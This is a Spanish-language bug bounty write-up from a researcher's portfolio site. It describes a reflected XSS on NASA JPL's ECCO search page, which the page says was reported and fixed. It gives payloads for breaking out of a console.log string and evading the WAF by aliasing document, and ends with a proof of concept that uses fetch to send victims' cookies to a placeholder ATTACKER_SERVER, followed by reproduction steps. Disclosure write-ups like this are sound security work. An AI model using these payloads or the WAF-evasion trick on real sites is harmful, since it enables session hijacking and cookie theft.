---
layout: default
---

<div class="container">
<article>
  <a href="../../../es/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    Cyber Research Portfolio
  </a>
  <div class="lang-switcher">
    <a href="../../../en/bounties/nasa-jpl-ecco-xss-waf-bypass/" class="lang-btn">English (EN)</a>
    <a href="./" class="lang-btn active">Español (ES)</a>
  </div>

  <div class="bounty-header">
    <h1>NASA JPL: Exfiltración de Cookies vía XSS</h1>
    <p>Bypass de Web Application Firewalls (WAF) para lograr el secuestro de sesiones en activos de NASA JPL ECCO.</p>
  </div>

  <div class="bounty-content">

    <h2>🔍 Búsqueda Inicial</h2>
    <p>Como en cualquier programa de bug bounty, lo primero fue usar la página como un usuario normal. El campo de búsqueda destacó, así que lo probamos:</p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></p>
    <p>Nos dimos cuenta de que el valor introducido se reflejaba directamente en el sitio web.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal.png" alt="Búsqueda Normal">
    <p>Al inspeccionar el código fuente, vimos que nuestra entrada estaba dentro de una función JavaScript <code>console.log()</code>:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal%20Result.png" alt="Resultado Búsqueda Normal">
    <pre><code>console.log('pwn');</code></pre>

    <h2>🛡️ Tag &lt;script&gt; Denegado</h2>
    <p>Realizamos pruebas básicas de XSS usando la etiqueta <code>&lt;script&gt;</code>:</p>
    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
    <p>El WAF rechazó nuestras solicitudes a la mínima señal de actividad maliciosa.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png" alt="WAF bloqueando tag script">

    <h2>🏗️ Cerrando el String de console.log</h2>
    <p>Decidimos intentar cerrar la función <code>console.log()</code> para insertar código justo después. Usamos el payload: <code>pwn');</code></p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');</code></p>
    <p>Insertamos <code>')</code> justo después del texto, que es lo que JavaScript necesitaba para cerrar <code>console.log()</code>. Sin embargo, el punto y coma <code>;</code> no se mostraba en la salida.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Closing%20console.log.png" alt="Cerrando console.log">

    <h2>❓ Concatenación de Javascript (No Funciona)</h2>
    <p>Intentamos añadir más código después del punto y coma:</p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></p>
    <p>Tras varias pruebas, no logramos que apareciera el punto y coma. Peor aún, todo lo que iba detrás desaparecía del texto.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Where%20is%20semicollon.png" alt="Dónde está el punto y coma">

    <h2>✅ Concatenación de Javascript (Funcionando)</h2>
    <p>Para que funcionara, tuvimos que codificar el punto y coma en formato URL, cambiándolo de <code>;</code> a <code>%3b</code>.</p>
    <pre><code># Codificar ; a %3b
pwn')%3balert(1)</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn')%3balert(1)</code></p>
    <p>A partir de ese momento, pudimos introducir código JavaScript para llevar a cabo el ataque.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Bypass%20Semicollon.png" alt="Bypass de punto y coma">

    <h2>🚨 Primer Alert (Funcionando)</h2>
    <p>Aunque el WAF no aceptaba el tag <code>&lt;script&gt;</code>, conseguimos que renderizara el tag de cierre <code>&lt;/script&gt;</code>.</p>
    <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(1)%3C/script%3E%3b//</code></p>
    <p>Ese payload fue suficiente para realizar un <strong>XSS Reflejado</strong> exitoso. Así se veía dentro del código:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201%20HTML.png" alt="Alert 1 HTML">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201.png" alt="Alert 1">

    <h2>🛑 Segundo Alert (Filtro del Firewall)</h2>
    <p>Una vez logrado ejecutar un <code>alert()</code>, quisimos ir más allá y exfiltrar cookies.</p>
    <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(document.cookie)%3C/script%3E%3b//</code></p>
    <p>Probamos varios payloads, pero el WAF seguía rechazando nuestras solicitudes. En cuanto detectaba cadenas sospechosas como <code>document.cookie</code>, las bloqueaba.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png" alt="WAF bloqueando document.cookie">

    <h2>🔓 Tercer Alert (Bypass del Firewall)</h2>
    <p>Para lograr un bypass efectivo del WAF, creamos una variable <code>a</code> que contenía <code>document</code>, y solicitamos <code>cookie</code> desde esa variable.</p>
    <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3balert(a.cookie)%3C/script%3E%3b//</code></p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Alert.png" alt="Alerta de Cookies con Bypass">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Result.png" alt="Resultado de Cookies">
    <pre><code>pwn');    // Rompemos la lógica del sistema.
a=document;  // Creamos la variable a que contiene document.
alert(a.cookie); // Llamada al alert con cookies
&lt;/script&gt;;//  // Cerramos el &lt;script&gt; y comentamos el resto del código</code></pre>

    <h2>🚀 Exploit Final (Exfiltración de Cookies)</h2>
    <p>Esta es la PoC final. En lugar de ejecutar <code>alert</code>, ejecuta directamente <code>fetch</code>, haciendo una petición a un servidor controlado por el atacante donde llegarán las cookies de la víctima.</p>
    <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration.png" alt="Exfiltración de Cookies">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration%20Request.png" alt="Petición de Exfiltración">

    <h2>🎯 Pasos para Reproducir</h2>
    <ol>
      <li>Iniciar un servidor web público (ej. usando <a href="https://serveo.net/" target="_blank">Serveo</a> exponiendo un servidor python local).</li>
      <li>Reemplazar <code>ATTACKER_SERVER</code> con la URL que Serveo genere.</li>
      <li>Visitar la URL:<br><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></li>
      <li>Recibirás una petición con las cookies de la víctima adjuntas.</li>
    </ol>

    <h2>🎖️ Reconocimiento y Premio</h2>
    <p>NASA JPL reconoció esta divulgación con una Carta de Reconocimiento oficial, confirmando el impacto y la remediación de la vulnerabilidad.</p>
    <div class="pdf-container">
      <iframe src="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf#toolbar=0" width="100%" height="100%" frameborder="0"></iframe>
    </div>
    <p style="text-align: center; margin-top: 20px;">
      <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" class="lang-btn" target="_blank">📥 Descargar Carta Oficial (PDF)</a>
    </p>

    <h2>🤝 Detalle de Colaboración</h2>
    <p>Esta investigación fue realizada en una <strong>colaboración al 50%</strong> entre <strong>{{ site.researchers.ivan.name }}</strong> y <strong>{{ site.researchers.diego.name }}</strong>. Ambos contribuyeron equitativamente al descubrimiento, explotación y documentación de esta vulnerabilidad.</p>
  </div>
</article>
</div>

<div class="zoom-overlay" id="zoomOverlay" onclick="this.classList.remove('active')">
  <img id="zoomImg" src="" alt="Zoom">
</div>
<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    document.getElementById('zoomImg').src = img.src;
    document.getElementById('zoomOverlay').classList.add('active');
  });
});
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
